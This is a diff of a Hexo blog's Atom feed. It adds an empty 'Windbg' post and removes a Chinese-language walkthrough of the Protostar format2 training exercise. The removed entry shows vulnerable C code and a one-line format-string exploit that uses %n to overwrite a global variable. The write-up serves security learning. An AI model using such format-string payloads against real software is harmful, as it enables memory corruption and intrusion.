@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-04-15T11:24:09.407Z</updated>
+  <updated>2020-06-03T03:32:36.180Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Windbg</title>
+    <link href="http://yoursite.com/2020/06/03/Windbg/"/>
+    <id>http://yoursite.com/2020/06/03/Windbg/</id>
+    <published>2020-06-03T03:30:47.000Z</published>
+    <updated>2020-06-03T03:32:36.180Z</updated>
+    
+    <content type="html"><![CDATA[<p>待更新。。。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;待更新。。。&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>二进制笔记</title>
@@ -415,27 +438,6 @@
     <summary type="html">
     
       &lt;h1 id=&quot;Format3&quot;&gt;&lt;a href=&quot;#Format3&quot; class=&quot;headerlink&quot; title=&quot;Format3&quot;&gt;&lt;/a&gt;Format3&lt;/h1&gt;&lt;p&gt;与Format1、Format2做法基本相同&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Protostar_format2</title>
-    <link href="http://yoursite.com/2018/09/12/Protostar-format2/"/>
-    <id>http://yoursite.com/2018/09/12/Protostar-format2/</id>
-    <published>2018-09-12T09:07:58.000Z</published>
-    <updated>2018-09-12T10:11:56.358Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Format2"><a href="#Format2" class="headerlink" title="Format2"></a>Format2</h1><p>与Format1异曲同工</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">buffer</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">64</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %d :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="查找”target“"><a href="#查找”target“" class="headerlink" title="查找”target“"></a>查找”target“</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ objdump -t format2 | grep target</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format2_1.jpg" data-fancybox="group" data-caption="format2_1" class="fancybox"><img alt="format2_1" title="format2_1" data-src="https://dblu3.github.io/img/Protostar/format2_1.jpg" class="lazyload"></a></p><h2 id="定位target的注入位置"><a href="#定位target的注入位置" class="headerlink" title="定位target的注入位置"></a>定位target的注入位置</h2><p><a href="https://dblu3.github.io/img/Protostar/format2_2.jpg" data-fancybox="group" data-caption="format2_2" class="fancybox"><img alt="format2_2" title="format2_2" data-src="https://dblu3.github.io/img/Protostar/format2_2.jpg" class="lazyload"></a><br>定位了偏移量之后，我们把最后一个%x改成%n，发现程序输出了target的值</p><p>因为要使<code>(target == 64)</code></p><p>所以我们把其中一个%x固定长度，使target = 64就OK了</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$  python -c &#39;print &quot;AAAA&quot; + &quot;\xe4\x96\x04\x08&quot; + “%29x” + &quot;%x &quot;*3 + &quot;%n &quot;&#39; | .&#x2F;format2</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format2_3.jpg" data-fancybox="group" data-caption="format2_3" class="fancybox"><img alt="format2_3" title="format2_3" data-src="https://dblu3.github.io/img/Protostar/format2_3.jpg" class="lazyload"></a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;Format2&quot;&gt;&lt;a href=&quot;#Format2&quot; class=&quot;headerlink&quot; title=&quot;Format2&quot;&gt;&lt;/a&gt;Format2&lt;/h1&gt;&lt;p&gt;与Format1异曲同工&lt;/p&gt;
     
     </summary>
     
